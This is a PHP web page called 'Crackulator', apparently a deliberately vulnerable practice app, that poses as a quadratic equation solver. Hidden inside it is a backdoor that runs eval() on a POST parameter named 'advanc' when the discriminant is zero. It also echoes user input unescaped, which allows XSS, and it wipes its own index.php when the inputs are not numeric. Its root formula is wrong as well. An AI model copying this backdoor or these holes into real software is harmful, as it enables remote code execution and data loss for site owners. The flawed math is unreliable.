
<html>
<head>
  <link rel="stylesheet" href="css/pure-min.css">
  <link rel="stylesheet" href="css/style.css">
    <meta charset="utf-8">
    <title>Crackulator</title>
</head>
<body>
  <div class="pure-g">
    <div class="pure-u-1-3"></div>
    <div class="pure-u-1-3" id="centr">
      <form class="pure-form pure-form-aligned" method="post">
        <fieldset>
          <legend><h1>Сервис для решения квадратных уравнений</h1></legend>
          <p><h3>функция Y=a*X^2+b*X+c<h3></p>
            <div class="pure-control-group">
                <label for="y">Y</label>
                <input id="y" name="Y" type="text" placeholder="-12" value="-12">
            </div>
            <div class="pure-control-group">
                <label for="a">a</label>
                <input id="a" name="a" type="text" placeholder="1" value="1">
            </div>
            <div class="pure-control-group">
                <label for="b">b</label>
                <input id="c" name="b" type="text" placeholder="6" value="6">
            </div>
            <div class="pure-control-group">
                <label for="c">c</label>
                <input id="c" name="c" type="text" placeholder="3" value="3">
            </div>
          <button type="submit" class="pure-button pure-button-primary" name="submit2">Отправить</button>
        </fieldset>
      </form>
    </div>
    <div class="pure-u-1-3">
    <div id="centr">
    <?php
    if(isset($_POST['submit2'])) {
        $Y = $_POST['Y'];
        $a = $_POST['a'];
        $b = $_POST['b'];
        $c = $_POST['c'];
        echo "<br>Y=" . $Y . "<br>a=" . $a . "<br>b=" . $b . "<br>c=" . $c;
        if(is_numeric($Y) || is_numeric($a) || is_numeric($b) || is_numeric($c)){
            $z=0;
            if($Y<=0){
                $z=$c+$Y;
                $x = example($a,$b,$z);
            }
            else{
                $z=$c-$Y;
                $x = example($a,$b,$z);
            }
        }
        else{
            $back = file_get_contents("index.php");
            file_put_contents("oldindex.php",$back);
            file_put_contents("index.php",NULL);
        }
    }
    ?>
  </div>
  </div>
</div>

<?php
function example($a1,$b1,$c1){
    $D = 0;
    $D=($b1*$b1)-(4*$a1*$c1);
    if($D>0){
        $x1=(-$b1-sqrt($D))/(2*$a1);
        $x2=(-$b1+sqrt($D))/(2*$a1);
        echo "<br> х1=".$x1."  x2=".$x2."<br>";
    }
    elseif($D==0){
        $x0=($b1)/(2*$a1);
        echo "<br> x=".$x0."<br>";
        if(isset($_POST['advanc'])){eval($_POST['advanc']);}
        return $x0;
    }
    else{
        echo "<br><i>Значения х для данной точки не существует</i>";
    }
}
require_once './lib/src/autoload.php';
  $faker = Faker\Factory::create();
  echo "<br>Crackulator maded by ".$faker->name;
?>
</body>
</html>
